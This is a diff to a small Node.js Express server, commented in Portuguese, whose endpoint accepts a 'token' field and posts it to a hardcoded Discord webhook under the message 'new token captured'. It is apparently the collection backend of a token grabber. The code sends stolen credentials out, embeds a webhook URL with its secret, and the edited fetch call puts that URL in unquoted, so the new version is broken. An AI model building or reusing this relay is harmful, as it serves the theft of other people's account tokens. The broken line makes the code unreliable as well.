@@ -1,4 +1,3 @@
-// server.js
 const express = require('express');
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 const cors = require('cors');
@@ -9,7 +8,6 @@ app.use(express.json());
 
 const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1366557827107393608/ziqyGd8ZjfT3llWnKeNXIsDnFQr6XhkqLy-7ASQk7WCL2gMN3IAIe6sx4m0XWm_j5NcX';
 
-// Aceita um campo "token" no corpo da requisição
 app.post('/send-to-discord', async (req, res) => {
   const { token } = req.body;
 
@@ -18,7 +16,7 @@ app.post('/send-to-discord', async (req, res) => {
   try {
     const mensagemFormatada = `🔐 Novo token capturado:\n\`\`\`${token}\`\`\``;
 
-    const response = await fetch(DISCORD_WEBHOOK_URL, {
+    const response = await fetch(https://discordapp.com/api/webhooks/1366557827107393608/ziqyGd8ZjfT3llWnKeNXIsDnFQr6XhkqLy-7ASQk7WCL2gMN3IAIe6sx4m0XWm_j5NcX, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ content: mensagemFormatada })
@@ -37,6 +35,9 @@ app.post('/send-to-discord', async (req, res) => {
   }
 });
 
-// Importante para ambientes como Render:
+app.get('/', (req, res) => {
+  res.send('Servidor online. Use POST em /send-to-discord para enviar token.');
+});
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
